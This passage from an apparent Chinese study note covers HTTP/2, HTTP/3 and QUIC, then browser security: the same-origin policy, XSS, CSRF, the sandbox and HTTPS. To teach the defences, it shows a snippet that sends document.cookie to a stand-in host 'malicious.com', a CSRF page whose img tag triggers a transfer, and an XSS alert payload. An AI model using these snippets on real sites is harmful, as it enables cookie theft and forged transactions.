title="多路复用的实现"></a>多路复用的实现</h3><p><img src="https://i.loli.net/2021/06/15/xhyXOAmt2lvpa3J.jpg" alt="Snipaste_2021-06-15_14-52-11.jpg"></p><p> HTTP/2 的请求和接收过程：</p><ul><li>首先，浏览器准备好请求数据，包括了请求行、请求头等信息，如果是 POST 方法，那么还要有请求体。</li><li>这些数据经过二进制分帧层处理之后，会被转换为一个个带有请求 ID 编号的帧，通过协议栈将这些帧发送给服务器。</li><li>服务器接收到所有帧之后，会将所有相同 ID 的帧合并为一条完整的请求信息。</li><li>然后服务器处理该条请求，并将处理的响应行、响应头和响应体分别发送至二进制分帧层。</li><li>同样，二进制分帧层会将这些响应数据转换为一个个带有请求 ID 编号的帧，经过协议栈发送给浏览器。</li><li>浏览器接收到响应帧之后，会根据 ID 编号将帧的数据提交给对应的请求。</li></ul><p>从上面的流程可以看出，<strong>通过引入二进制分帧层，就实现了 HTTP 的多路复用技术</strong>。</p><h3 id="HTTP-2-其他特性"><a href="#HTTP-2-其他特性" class="headerlink" title="HTTP/2 其他特性"></a>HTTP/2 其他特性</h3><h4 id="1-可以设置请求的优先级"><a href="#1-可以设置请求的优先级" class="headerlink" title="1. 可以设置请求的优先级"></a>1. 可以设置请求的优先级</h4><p>HTTP/2 提供了请求优先级，可以在发送请求时，标上该请求的优先级，这样服务器接收到请求之后，会优先处理优先级高的请求。</p><h4 id="2-服务器推送"><a href="#2-服务器推送" class="headerlink" title="2. 服务器推送"></a>2. 服务器推送</h4><p>除了设置请求的优先级外，HTTP/2 还可以直接将数据提前推送到浏览器。你可以想象这样一个场景，当用户请求一个 HTML 页面之后，服务器知道该 HTML 页面会引用几个重要的 JavaScript 文件和 CSS 文件，那么在接收到 HTML 请求之后，附带将要使用的 CSS 文件和 JavaScript 文件一并发送给浏览器，这样当浏览器解析完 HTML 文件之后，就能直接拿到需要的 CSS 文件和 JavaScript 文件，这对首次打开页面的速度起到了至关重要的作用。</p><h4 id="3-头部压缩"><a href="#3-头部压缩" class="headerlink" title="3. 头部压缩"></a>3. 头部压缩</h4><p>HTTP/2 对请求头和响应头进行了压缩。</p><h2 id="HTTP-3：甩掉TCP、TLS-的包袱，构建高效网络"><a href="#HTTP-3：甩掉TCP、TLS-的包袱，构建高效网络" class="headerlink" title="HTTP/3：甩掉TCP、TLS 的包袱，构建高效网络"></a>HTTP/3：甩掉TCP、TLS 的包袱，构建高效网络</h2><h3 id="HTTP-2-缺陷——TCP-的队头阻塞"><a href="#HTTP-2-缺陷——TCP-的队头阻塞" class="headerlink" title="HTTP/2 缺陷——TCP 的队头阻塞"></a>HTTP/2 缺陷——TCP 的队头阻塞</h3><p>虽然 HTTP/2 解决了应用层面的队头阻塞问题，不过和 HTTP/1.1 一样，HTTP/2 依然是基于 TCP 协议的，而 TCP 最初就是为了单连接而设计的。如果在数据传输的过程中，有一个数据因为网络故障或者其他原因而丢包了，那么整个 TCP 的连接就会处于暂停状态，需要等待丢失的数据包被重新传输过来。参考下图：</p><p><img src="https://i.loli.net/2021/06/15/uJN8lmU9PgQpakG.jpg" alt="Snipaste_2021-06-15_15-03-12.jpg"></p><p>正常情况下 HTTP/2 是怎么传输多路请求的，为了直观理解，可以参考下图：</p><p><img src="https://i.loli.net/2021/06/15/gOT2wPQjRy6EYSD.jpg" alt="Snipaste_2021-06-15_15-04-49.jpg"></p><p>在 HTTP/2 中，多个请求是跑在一个 TCP 管道中的，如果其中任意一路数据流中出现了丢包的情况，那么就会阻塞该 TCP 连接中的所有请求。这不同于 HTTP/1.1，使用 HTTP/1.1 时，浏览器为每个域名开启了 6 个 TCP 连接，如果其中的 1 个 TCP 连接发生了队头阻塞，那么其他的 5 个连接依然可以继续传输数据。</p><p>所以随着丢包率的增加，HTTP/2 的传输效率也会越来越差。有测试数据表明，当系统达到了 2% 的丢包率时，HTTP/1.1 的传输效率反而比 HTTP/2 表现得更好。</p><h3 id="TCP-建立连接的延时"><a href="#TCP-建立连接的延时" class="headerlink" title="TCP 建立连接的延时"></a>TCP 建立连接的延时</h3><p>TCP 的握手过程也是影响传输效率的一个重要因素。HTTP/1 和 HTTP/2 都是使用 TCP 协议来传输的，而如果使用 HTTPS 的话，还需要使用 TLS 协议进行安全传输，而使用 TLS 也需要一个握手过程，这样就需要有两个握手延迟过程。</p><ol><li>在建立 TCP 连接的时候，需要和服务器进行三次握手来确认连接成功，也就是说需要在消耗完 1.5 个 RTT 之后才能进行数据传输。</li><li>进行 TLS 连接，TLS 有两个版本——TLS1.2 和 TLS1.3，每个版本建立连接所花的时间不同，大致是需要 1～2 个 RTT。</li></ol><h3 id="TCP-协议僵化"><a href="#TCP-协议僵化" class="headerlink" title="TCP 协议僵化"></a>TCP 协议僵化</h3><p>第一个是<strong>中间设备的僵化</strong>。这些中间设备有很多种类型，并且每种设备都有自己的目的，这些设备包括了路由器、防火墙、NAT、交换机等。它们通常依赖一些很少升级的软件，这些软件使用了大量的 TCP 特性，这些功能被设置之后就很少更新了。所以，如果我们在客户端升级了 TCP 协议，但是当新协议的数据包经过这些中间设备时，它们可能不理解包的内容，于是这些数据就会被丢弃掉。这就是中间设备僵化，它是阻碍 TCP 更新的一大障碍。</p><p><strong>操作系统也是导致 TCP 协议僵化的另外一个原因</strong>。因为 TCP 协议都是通过操作系统内核来实现的，应用程序只能使用不能修改。通常操作系统的更新都滞后于软件的更新，因此要想自由地更新内核中的 TCP 协议也是非常困难的。</p><h3 id="QUIC-协议"><a href="#QUIC-协议" class="headerlink" title="QUIC 协议"></a>QUIC 协议</h3><p>HTTP/3 选择基于 UDP 实现类似于 TCP 的多路数据流、传输可靠性等功能，我们把这套功能称为<strong>QUIC 协议</strong>。关于 HTTP/2 和 HTTP/3 协议栈的比较，可以参考下图：</p><p><img src="https://i.loli.net/2021/06/15/2K3kybagoAHzrFI.jpg" alt="Snipaste_2021-06-15_15-10-44.jpg"></p><p>HTTP/3 中的 QUIC 协议集合了以下几点功能。</p><ul><li><p><strong>实现了类似 TCP 的流量控制、传输可靠性的功能</strong>。虽然 UDP 不提供可靠性的传输，但 QUIC 在 UDP 的基础之上增加了一层来保证数据可靠性传输。它提供了数据包重传、拥塞控制以及其他一些 TCP 中存在的特性。</p></li><li><p><strong>集成了 TLS 加密功能</strong>。目前 QUIC 使用的是 TLS1.3，相较于早期版本 TLS1.3 有更多的优点，其中最重要的一点是减少了握手所花费的 RTT 个数。</p></li><li><p><strong>实现了 HTTP/2 中的多路复用功能</strong>。和 TCP 不同，QUIC 实现了在同一物理连接上可以有多个独立的逻辑数据流（如下图）。实现了数据流的单独传输，就解决了 TCP 中队头阻塞的问题。<img src="https://i.loli.net/2021/06/15/eHhQVw29qI1YyzO.jpg" alt="Snipaste_2021-06-15_15-11-45.jpg"></p></li><li><p><strong>实现了快速握手功能</strong>。由于 QUIC 是基于 UDP 的，所以 QUIC 可以实现使用 0-RTT 或者 1-RTT 来建立连接，这意味着 QUIC 可以用最快的速度来发送和接收数据，这样可以大大提升首次打开页面的速度。</p></li></ul><h3 id="HTTP-3-的挑战"><a href="#HTTP-3-的挑战" class="headerlink" title="HTTP/3 的挑战"></a>HTTP/3 的挑战</h3><p>第一，从目前的情况来看，服务器和浏览器端都没有对 HTTP/3 提供比较完整的支持。</p><p>第二，部署 HTTP/3 也存在着非常大的问题。因为系统内核对 UDP 的优化远远没有达到 TCP 的优化程度，这也是阻碍 QUIC 的一个重要原因。</p><p>第三，中间设备僵化的问题。这些设备对 UDP 的优化程度远远低于 TCP，据统计使用 QUIC 协议时，大约有 3%～7% 的丢包率。</p><hr><h1 id="浏览器安全"><a href="#浏览器安全" class="headerlink" title="浏览器安全"></a>浏览器安全</h1><h2 id="同源策略：为什么XMLHttpRequest不能跨域请求资源？"><a href="#同源策略：为什么XMLHttpRequest不能跨域请求资源？" class="headerlink" title="同源策略：为什么XMLHttpRequest不能跨域请求资源？"></a>同源策略：为什么XMLHttpRequest不能跨域请求资源？</h2><p>页面中最基础、最核心的安全策略：<strong>同源策略</strong></p><h3 id="什么是同源策略"><a href="#什么是同源策略" class="headerlink" title="什么是同源策略"></a>什么是同源策略</h3><p>如果两个 URL 的协议、域名和端口都相同，我们就称这两个 URL 同源。浏览器默认两个相同的源之间是可以相互访问资源和操作 DOM 的。两个不同的源之间若想要相互访问资源或者操作 DOM，那么会有一套基础的安全策略的制约，我们把这称为<strong>同源策略</strong>。</p><p>具体来讲，同源策略主要表现在 DOM、Web 数据和网络这三个层面。</p><p><strong>第一个，DOM 层面</strong>。同源策略限制了来自不同源的 JavaScript 脚本对当前 DOM 对象读和写的操作。</p><p><strong>第二个，数据层面</strong>。同源策略限制了不同源的站点读取当前站点的 Cookie、IndexDB、LocalStorage 等数据。</p><p><strong>第三个，网络层面</strong>。同源策略限制了通过 XMLHttpRequest 等方式将站点的数据发送给不同源的站点。</p><h3 id="安全和便利性的权衡"><a href="#安全和便利性的权衡" class="headerlink" title="安全和便利性的权衡"></a>安全和便利性的权衡</h3><h4 id="1-页面中可以嵌入第三方资源"><a href="#1-页面中可以嵌入第三方资源" class="headerlink" title="1. 页面中可以嵌入第三方资源"></a>1. 页面中可以嵌入第三方资源</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onClick</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> url = <span class="string">`http://malicious.com?cookie = <span class="subst">$&#123;<span class="built_in">document</span>.cookie&#125;</span>`</span></span><br><span class="line">  open(url)</span><br><span class="line">&#125;</span><br><span class="line">onClick()</span><br></pre></td></tr></table></figure><p>在这段代码中，恶意脚本读取 Cookie 数据，并将其作为参数添加至恶意站点尾部，当打开该恶意页面时，恶意服务器就能接收到当前用户的 Cookie 信息。</p><p>以上就是一个非常典型的 XSS 攻击。为了解决 XSS 攻击，浏览器中引入了内容安全策略，称为 CSP。<strong>CSP 的核心思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码</strong>。通过这些手段就可以大大减少 XSS 攻击。</p><h4 id="2-跨域资源共享和跨文档消息机制"><a href="#2-跨域资源共享和跨文档消息机制" class="headerlink" title="2. 跨域资源共享和跨文档消息机制"></a>2. 跨域资源共享和跨文档消息机制</h4><p>默认情况下，如果打开极客邦的官网页面，在官网页面中通过 XMLHttpRequest 或者 Fetch 来请求 InfoQ 中的资源，这时同源策略会阻止其向 InfoQ 发出请求，这样会大大制约我们的生产力。</p><p>为了解决这个问题，我们引入了<strong>跨域资源共享（CORS）</strong>，使用该机制可以进行跨域访问控制，从而使跨域数据传输得以安全进行。</p><p>在介绍同源策略时，我们说明了如果两个页面不是同源的，则无法相互操纵 DOM。不过在实际应用中，经常需要两个不同源的 DOM 之间进行通信，于是浏览器中又引入了<strong>跨文档消息机制</strong>，可以通过 window.postMessage 的 JavaScript 接口来和不同源的 DOM 进行通信。</p><h2 id="跨站脚本攻击（XSS）：为什么Cookie中有HttpOnly属性？"><a href="#跨站脚本攻击（XSS）：为什么Cookie中有HttpOnly属性？" class="headerlink" title="跨站脚本攻击（XSS）：为什么Cookie中有HttpOnly属性？"></a>跨站脚本攻击（XSS）：为什么Cookie中有HttpOnly属性？</h2><h3 id="什么是-XSS-攻击"><a href="#什么是-XSS-攻击" class="headerlink" title="什么是 XSS 攻击"></a>什么是 XSS 攻击</h3><p>XSS 全称是 Cross Site Scripting，为了与“CSS”区分开来，故简称 XSS，翻译过来就是“跨站脚本”。XSS 攻击是指黑客往 HTML 文件中或者 DOM 中注入恶意脚本，从而在用户浏览页面时利用注入的恶意脚本对用户实施攻击的一种手段。</p><p>当页面被注入了恶意 JavaScript 脚本时，浏览器无法区分这些脚本是被恶意注入的还是正常的页面内容，所以恶意注入 JavaScript 脚本也拥有所有的脚本权限。</p><ul><li>可以<strong>窃取 Cookie 信息</strong>。恶意 JavaScript 可以通过“document.cookie”获取 Cookie 信息，然后通过 XMLHttpRequest 或者 Fetch 加上 CORS 功能将数据发送给恶意服务器；恶意服务器拿到用户的 Cookie 信息之后，就可以在其他电脑上模拟用户的登录，然后进行转账等操作。</li><li>可以<strong>监听用户行为</strong>。恶意 JavaScript 可以使用“addEventListener”接口来监听键盘事件，比如可以获取用户输入的信用卡等信息，将其发送到恶意服务器。黑客掌握了这些信息之后，又可以做很多违法的事情。</li><li>可以通过<strong>修改 DOM</strong>伪造假的登录窗口，用来欺骗用户输入用户名和密码等信息。</li><li>还可以<strong>在页面内生成浮窗广告</strong>，这些广告会严重地影响用户体验。</li></ul><h3 id="恶意脚本是怎么注入的"><a href="#恶意脚本是怎么注入的" class="headerlink" title="恶意脚本是怎么注入的"></a>恶意脚本是怎么注入的</h3><p>通常情况下，主要有<strong>存储型 XSS 攻击、反射型 XSS 攻击</strong>和<strong>基于 DOM 的 XSS 攻击</strong>三种方式来注入恶意脚本。</p><h4 id="1-存储型-XSS-攻击"><a href="#1-存储型-XSS-攻击" class="headerlink" title="1. 存储型 XSS 攻击"></a>1. 存储型 XSS 攻击</h4><p>大致需要经过如下步骤：</p><ul><li>首先黑客利用站点漏洞将一段恶意 JavaScript 代码提交到网站的数据库中；</li><li>然后用户向网站请求包含了恶意 JavaScript 脚本的页面；</li><li>当用户浏览该页面的时候，恶意脚本就会将用户的 Cookie 信息等数据上传到服务器。</li></ul><h4 id="2-反射型-XSS-攻击"><a href="#2-反射型-XSS-攻击" class="headerlink" title="2. 反射型 XSS 攻击"></a>2. 反射型 XSS 攻击</h4><p>在一个反射型 XSS 攻击过程中，恶意 JavaScript 脚本属于用户发送给网站请求中的一部分，随后网站又把恶意 JavaScript 脚本返回给用户。当恶意 JavaScript 脚本在用户页面中被执行时，黑客就可以利用该脚本做一些恶意操作。<strong>Web 服务器不会存储反射型 XSS 攻击的恶意脚本，这是和存储型 XSS 攻击不同的地方</strong>。</p><h4 id="3-基于-DOM-的-XSS-攻击"><a href="#3-基于-DOM-的-XSS-攻击" class="headerlink" title="3. 基于 DOM 的 XSS 攻击"></a>3. 基于 DOM 的 XSS 攻击</h4><p>基于 DOM 的 XSS 攻击是不牵涉到页面 Web 服务器的。具体来讲，黑客通过各种手段将恶意脚本注入用户的页面中，比如通过网络劫持在页面传输过程中修改 HTML 页面的内容，这种劫持类型很多，有通过 WiFi 路由器劫持的，有通过本地恶意软件来劫持的，它们的共同点是在 Web 资源传输过程或者在用户使用页面的过程中修改 Web 页面的数据。</p><h3 id="如何阻止-XSS-攻击"><a href="#如何阻止-XSS-攻击" class="headerlink" title="如何阻止 XSS 攻击"></a>如何阻止 XSS 攻击</h3><p>存储型 XSS 攻击和反射型 XSS 攻击是服务端的安全漏洞，基于 DOM 的 XSS 攻击是属于前端的安全漏洞。它们都有一个共同点，那就是<strong>首先往浏览器中注入恶意脚本，然后再通过恶意脚本将用户信息发送至黑客部署的恶意服务器上。</strong></p><p>所以要阻止 XSS 攻击，我们可以通过阻止恶意 JavaScript 脚本的注入和恶意消息的发送来实现。</p><h4 id="1-服务器对输入脚本进行过滤或转码"><a href="#1-服务器对输入脚本进行过滤或转码" class="headerlink" title="1. 服务器对输入脚本进行过滤或转码"></a>1. 服务器对输入脚本进行过滤或转码</h4><p>不管是反射型还是存储型 XSS 攻击，我们都可以在服务器端将一些关键的字符进行转码，比如最典型的：<code>code:&lt;script&gt;alert(&#39;你被 xss 攻击了&#39;)&lt;/script&gt;</code> 这段代码过滤后，只留下了：<code>code:</code> 这样，当用户再次请求该页面时，由于``标签的内容都被过滤了，所以这段脚本在客户端是不可能被执行的。</p><p>除了过滤之外，服务器还可以对这些内容进行转码，还是上面那段代码，经过转码之后，效果如下所示：<code>code:&amp;lt;script&amp;gt;alert(&amp;#39; 你被 xss 攻击了 &amp;#39;)&amp;lt;/script&amp;gt;</code> 经过转码之后的内容，如``标签被转换为<code>&lt;script&gt;</code>，因此即使这段脚本返回给页面，页面也不会执行这段脚本。</p><h4 id="2-充分利用-CSP"><a href="#2-充分利用-CSP" class="headerlink" title="2. 充分利用 CSP"></a>2. 充分利用 CSP</h4><p>实施严格的 CSP 可以有效地防范 XSS 攻击，具体来讲 CSP 有如下几个功能：</p><ul><li>限制加载其他域下的资源文件，这样即使黑客插入了一个 JavaScript 文件，这个 JavaScript 文件也是无法被加载的；</li><li>禁止向第三方域提交数据，这样用户数据也不会外泄；</li><li>禁止执行内联脚本和未授权的脚本；</li><li>还提供了上报机制，这样可以帮助我们尽快发现有哪些 XSS 攻击，以便尽快修复问题。</li></ul><h4 id="3-使用-HttpOnly-属性"><a href="#3-使用-HttpOnly-属性" class="headerlink" title="3. 使用 HttpOnly 属性"></a>3. 使用 HttpOnly 属性</h4><p>由于很多 XSS 攻击都是来盗用 Cookie 的，因此还可以通过使用 HttpOnly 属性来保护我们 Cookie 的安全。通常服务器可以将某些 Cookie 设置为 HttpOnly 标志，HttpOnly 是服务器通过 HTTP 响应头来设置的。</p><p>使用 HttpOnly 标记的 Cookie 只能使用在 HTTP 请求过程中，所以无法通过 JavaScript 来读取这段 Cookie。</p><p>由于 JavaScript 无法读取设置了 HttpOnly 的 Cookie 数据，所以即使页面被注入了恶意 JavaScript 脚本，也是无法获取到设置了 HttpOnly 的数据。因此一些比较重要的数据我们建议设置 HttpOnly 标志。</p><h2 id="CSRF攻击：陌生链接不要随便点"><a href="#CSRF攻击：陌生链接不要随便点" class="headerlink" title="CSRF攻击：陌生链接不要随便点"></a>CSRF攻击：陌生链接不要随便点</h2><h3 id="什么是-CSRF-攻击"><a href="#什么是-CSRF-攻击" class="headerlink" title="什么是 CSRF 攻击"></a>什么是 CSRF 攻击</h3><p>CSRF 英文全称是 Cross-site request forgery，所以又称为“跨站请求伪造”，是指黑客 引诱用户打开黑客的网站，在黑客的网站中，利用用户的登录状态发起的跨站请求。简单来 讲，<strong>CSRF 攻击就是黑客利用了用户的登录状态，并通过第三方的站点来做一些坏事。</strong></p><h4 id="1-自动发起-Get-请求"><a href="#1-自动发起-Get-请求" class="headerlink" title="1. 自动发起 Get 请求"></a>1. 自动发起 Get 请求</h4><p>黑客最容易实施的攻击方式是自动发起 Get 请求，具体攻击方式你可以参考下面这段代码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span> 黑客的站点：CSRF 攻击演示 <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://time.geekbang.org/sendcoin?user=hacker&amp;number=100&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这是黑客页面的 HTML 代码，在这段代码中，黑客将转账的请求接口隐藏在 img 标签内， 欺骗浏览器这是一张图片资源。当该页面被加载时，浏览器会自动发起 img 的资源请求，如果服务器没有对该请求做判断的话，那么服务器就会认为该请求是一个转账请求，于是用 户账户上的 100 极客币就被转移到黑客的账户上去了。</p><h4 id="2-自动发起-POST-请求"><a href="#2-自动发起-POST-请求" class="headerlink" title="2. 自动发起 POST 请求"></a>2. 自动发起 POST 请求</h4><p><img src="https://i.loli.net/2021/06/15/TirZDxqEkoaK6tu.jpg" alt="Snipaste_2021-06-15_16-05-09.jpg"></p><p>在这段代码中，我们可以看到黑客在他的页面中构建了一个隐藏的表单，该表单的内容就是 极客时间的转账接口。当用户打开该站点之后，这个表单会被自动执行提交；当表单被提交 之后，服务器就会执行转账操作。因此使用构建自动提交表单这种方式，就可以自动实现跨 站点 POST 数据提交。</p><h4 id="3-引诱用户点击链接"><a href="#3-引诱用户点击链接" class="headerlink" title="3. 引诱用户点击链接"></a>3. 引诱用户点击链接</h4><p><strong>和 XSS 不同的是，CSRF 攻击不需要将恶 意代码注入用户的页面，仅仅是利用服务器的漏洞和用户的登录状态来实施攻击。</strong></p><h3 id="如何防止-CSRF-攻击"><a href="#如何防止-CSRF-攻击" class="headerlink" title="如何防止 CSRF 攻击"></a>如何防止 CSRF 攻击</h3><p>发起 CSRF 攻击的三个必要条 件：</p><ul><li>第一个，目标站点一定要有 CSRF 漏洞； </li><li>第二个，用户要登录过目标站点，并且在浏览器上保持有该站点的登录状态； </li><li>第三个，需要用户打开一个第三方站点，可以是黑客的站点，也可以是一些论坛。</li></ul><p>与 XSS 攻击不同，CSRF 攻击不会往页面注入恶意脚本，因此黑客是无法通过 CSRF 攻击来获取用户页面数据的；其最关键的一点是要能找到服务器的漏洞，所以说对于 CSRF 攻击我们主要的防护手段是提升服务器的安全性。</p><p>服务器避免遭受到 CSRF 攻击，通常有以下几种途径:</p><h4 id="1-充分利用好-Cookie-的-SameSite-属性"><a href="#1-充分利用好-Cookie-的-SameSite-属性" class="headerlink" title="1. 充分利用好 Cookie 的 SameSite 属性"></a>1. 充分利用好 Cookie 的 SameSite 属性</h4><p>Cookie 是浏览器和服务器之间维护登录状态的一个关键数据。通常 CSRF 攻击都是从第三方站点发起的，要防止 CSRF 攻击，我们最好能实现从第三方 站点发送请求时禁止 Cookie 的发送，因此在浏览器通过不同来源发送 HTTP 请求时，有 如下区别：</p><ul><li>如果是从第三方站点发起的请求，那么需要浏览器禁止发送某些关键 Cookie 数据到服 务器；</li><li>如果是同一个站点发起的请求，那么就需要保证 Cookie 数据正常发送。</li></ul><p>在 HTTP 响应头中，通过 set-cookie 字段设置 Cookie 时，可以带上 SameSite 选项。</p><p><strong>SameSite 选项通常有 Strict、Lax 和 None 三个值。</strong></p><ul><li>Strict 最为严格。如果 SameSite 的值是 Strict，那么浏览器会完全禁止第三方 Cookie。简言之，如果你从极客时间的页面中访问 InfoQ 的资源，而 InfoQ 的某些 Cookie 设置了 SameSite = Strict 的话，那么这些 Cookie 是不会被发送到 InfoQ 的服 务器上的。只有你从 InfoQ 的站点去请求 InfoQ 的资源时，才会带上这些 Cookie。 </li><li>Lax 相对宽松一点。在跨站点的情况下，从第三方站点的链接打开和从第三方站点提交 Get 方式的表单这两种方式都会携带 Cookie。但如果在第三方站点中使用 Post 方法， 或者通过 img、iframe 等标签加载的 URL，这些场景都不会携带 Cookie。 </li><li>而如果使用 None 的话，在任何情况下都会发送 Cookie 数据。</li></ul><p>对于防范 CSRF 攻击，我们可以针对实际情况将一些关键的 Cookie 设置为 Strict 或者 Lax 模式，这样在跨站点请求时，这些关键的 Cookie 就不会被发送到服务器，从而使得黑客的 CSRF 攻击失效。</p><h4 id="2-验证请求的来源站点"><a href="#2-验证请求的来源站点" class="headerlink" title="2. 验证请求的来源站点"></a>2. 验证请求的来源站点</h4><p>在服务器端验证请求来源的站点。由于 CSRF 攻击大多来自于第三方站点，因此服务器可以禁止来自第三方站点的请 求。</p><p>HTTP 请求头中的 Referer 和 Origin 属性：</p><ul><li>Referer 是 HTTP 请求头中的一个字段，记录了该 HTTP 请求的来源地址。比如从极客时间的官网打开了 InfoQ 的站点，那么请求头中的 Referer 值是极客时间的 URL。虽然可以通过 Referer 告诉服务器 HTTP 请求的来源，但是有一些场景是不适合将来源 URL 暴露给服务器的，因此浏览器提供给开发者一个选项，可以不用上传 Referer 值。</li><li>但在服务器端验证请求头中的 Referer 并不是太可靠，因此标准委员会又制定了Origin 属 性，在一些重要的场合，比如通过 XMLHttpRequest、Fecth 发起跨站请求或者通过 Post 方法发送请求时，都会带上 Origin 属性。</li></ul><p>Origin 属性只包含了域名信息，并没有包含具体的 URL 路径，这是 Origin 和 Referer 的一个主要区别。因此，服务器的策略是优先判断 Origin，如果请求头中没有包含 Origin 属性，再根据实际情况判断是否使用 Referer 值。</p><h4 id="3-CSRF-Token"><a href="#3-CSRF-Token" class="headerlink" title="3. CSRF Token"></a>3. CSRF Token</h4><p>第一步，在浏览器向服务器发起请求时，服务器生成一个 CSRF Token。CSRF Token 其实就是服务器生成的字符串，然后将该字符串植入到返回的页面中。</p><p>第二步，在浏览器端如果要发起转账的请求，那么需要带上页面中的 CSRF Token，然后服 务器会验证该 Token 是否合法。如果是从第三方站点发出的请求，那么将无法获取到 CSRF Token 的值，所以即使发出了请求，服务器也会因为 CSRF Token 不正确而拒绝请求。</p><h2 id="安全沙箱：页面和系统之间的隔离墙"><a href="#安全沙箱：页面和系统之间的隔离墙" class="headerlink" title="安全沙箱：页面和系统之间的隔离墙"></a>安全沙箱：页面和系统之间的隔离墙</h2><p>浏览器本身的漏洞是单进程浏览器的一个主要问题，如果浏览器被曝出存在漏洞，那么在这些漏洞没有被及时修复的情况下，黑客就有可能通过恶意的页面向浏览器中注入恶意程序，其中最常见的攻击方式是利用<strong>缓冲区溢出</strong>，不过需要<strong>注意这种类型的攻击和 XSS 注入的脚本是不一样的。</strong></p><ul><li>XSS 攻击只是将恶意的 JavaScript 脚本注入到页面中，虽然能窃取一些 Cookie 相关的数据，但是 XSS 无法对操作系统进行攻击。</li><li>而通过浏览器漏洞进行的攻击是可以入侵到浏览器进程内部的，可以读取和修改浏览器进程内部的任意内容，还可以穿透浏览器，在用户的操作系统上悄悄地安装恶意软件、监听用户键盘输入信息以及读取用户硬盘上的文件内容。</li></ul><h3 id="安全视角下的多进程架构"><a href="#安全视角下的多进程架构" class="headerlink" title="安全视角下的多进程架构"></a>安全视角下的多进程架构</h3><p><img src="https://i.loli.net/2021/06/15/t5YT2AHZoVwfaWn.jpg" alt="Snipaste_2021-06-15_16-25-16.jpg"></p><p>我们知道浏览器被划分为浏览器内核和渲染内核两个核心模块，其中浏览器内核是由网络进程、浏览器主进程和 GPU 进程组成的，渲染内核就是渲染进程。那如果我们在浏览器中打开一个页面，这两个模块是怎么配合的呢？</p><p>所有的网络资源都是通过浏览器内核来下载的，下载后的资源会通过 IPC 将其提交给渲染进程（浏览器内核和渲染进程之间都是通过 IPC 来通信的）。然后渲染进程会对这些资源进行解析、绘制等操作，最终生成一幅图片。但是渲染进程并不负责将图片显示到界面上，而是将最终生成的图片提交给浏览器内核模块，由浏览器内核模块负责显示这张图片。</p><h3 id="安全沙箱"><a href="#安全沙箱" class="headerlink" title="安全沙箱"></a>安全沙箱</h3><p>浏览器可以安全地下载各种网络资源，但是如果要执行这些网络资源，比如解析 HTML、解析 CSS、执行 JavaScript、图片编解码等操作，就需要非常谨慎了，因为一不小心，黑客就会利用这些操作对含有漏洞的浏览器发起攻击。</p><p>所以我们需要在渲染进程和操作系统之间建一道墙，即便渲染进程由于存在漏洞被黑客攻击，但由于这道墙，黑客就获取不到渲染进程之外的任何操作权限。<strong>将渲染进程和操作系统隔离的这道墙就是我们要聊的安全沙箱。</strong></p><p>浏览器中的安全沙箱是利用操作系统提供的安全技术，让渲染进程在执行过程中无法访问或者修改操作系统中的数据，在渲染进程需要访问系统资源的时候，需要通过浏览器内核来实现，然后将访问的结果通过 IPC 转发给渲染进程。</p><p>安全沙箱最小的保护单位是进程。因为单进程浏览器需要频繁访问或者修改操作系统的数据，所以单进程浏览器是无法被安全沙箱保护的，而现代浏览器采用的多进程架构使得安全沙箱可以发挥作用。</p><h3 id="安全沙箱如何影响各个模块功能"><a href="#安全沙箱如何影响各个模块功能" class="headerlink" title="安全沙箱如何影响各个模块功能"></a>安全沙箱如何影响各个模块功能</h3><p><img src="https://i.loli.net/2021/06/15/G5OdEmhKgB8l79F.jpg" alt="Snipaste_2021-06-15_16-28-39.jpg"></p><p>我们可以看到由于渲染进程需要安全沙箱的保护，因此需要把在渲染进程内部涉及到和系统交互的功能都转移到浏览器内核中去实现。</p><h4 id="1-持久存储"><a href="#1-持久存储" class="headerlink" title="1. 持久存储"></a>1. 持久存储</h4><p>文件内容的读写都是在浏览器内核中完成的：</p><ul><li>存储 Cookie 数据的读写。通常浏览器内核会维护一个存放所有 Cookie 的 Cookie 数据库，然后当渲染进程通过 JavaScript 来读取 Cookie 时，渲染进程会通过 IPC 将读取 Cookie 的信息发送给浏览器内核，浏览器内核读取 Cookie 之后再将内容返回给渲染进程。</li><li>一些缓存文件的读写也是由浏览器内核实现的，比如网络文件缓存的读取。</li></ul><h4 id="2-网络访问"><a href="#2-网络访问" class="headerlink" title="2. 网络访问"></a>2. 网络访问</h4><p>同样有了安全沙箱的保护，在渲染进程内部也是不能直接访问网络的，如果要访问网络，则需要通过浏览器内核。不过浏览器内核在处理 URL 请求之前，会检查渲染进程是否有权限请求该 URL，比如检查 XMLHttpRequest 或者 Fetch 是否是跨站点请求，或者检测 HTTPS 的站点中是否包含了 HTTP 的请求。</p><h4 id="3-用户交互"><a href="#3-用户交互" class="headerlink" title="3. 用户交互"></a>3. 用户交互</h4><h2 id="HTTPS：让数据传输更安全"><a href="#HTTPS：让数据传输更安全" class="headerlink" title="HTTPS：让数据传输更安全"></a>HTTPS：让数据传输更安全</h2><h3 id="在-HTTP-协议栈中引入安全层"><a href="#在-HTTP-协议栈中引入安全层" class="headerlink" title="在 HTTP 协议栈中引入安全层"></a>在 HTTP 协议栈中引入安全层</h3><p><img src="https://i.loli.net/2021/06/15/pPkjuvtW3bs6h45.jpg" alt="Snipaste_2021-06-15_16-35-08.jpg"></p><p>通常 HTTP 直接和 TCP 通信，HTTPS 则先和安全层通信，然后安全层再和 TCP 层通信。也就是说 HTTPS 所有的安全核心都在安全层，它不会影响到上面的 HTTP 协议，也不会影响到下面的 TCP/IP。</p><p>总的来说，安全层有两个主要的职责：<strong>对发起 HTTP 请求的数据进行加密操作和对接收到 HTTP 的内容进行解密操作。</strong></p><h4 id="第一版：使用对称加密"><a 